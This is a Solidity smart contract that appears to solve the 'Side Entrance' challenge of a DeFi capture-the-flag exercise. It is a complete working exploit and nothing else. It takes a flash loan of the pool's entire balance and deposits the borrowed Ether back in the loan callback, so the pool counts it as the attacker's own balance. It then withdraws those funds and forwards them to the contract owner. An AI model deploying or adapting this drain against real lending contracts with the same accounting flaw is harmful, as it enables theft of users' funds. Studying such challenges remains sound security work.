// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceLenderPoolAttack {
    ISideEntranceLenderPool immutable LENDING_POOL;
    address immutable OWNER;

    constructor(address lendPoolAddress) {
        LENDING_POOL = ISideEntranceLenderPool(lendPoolAddress);
        OWNER = msg.sender;
    }

    function attack() external {
        require(msg.sender == OWNER, "ownly the owner can attack");
        uint256 amount = address(LENDING_POOL).balance;
        LENDING_POOL.flashLoan(amount);
        LENDING_POOL.withdraw();
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    function execute() external payable {
        uint256 amount = address(this).balance;
        LENDING_POOL.deposit{value: amount}();
    }

    receive() external payable {}
}
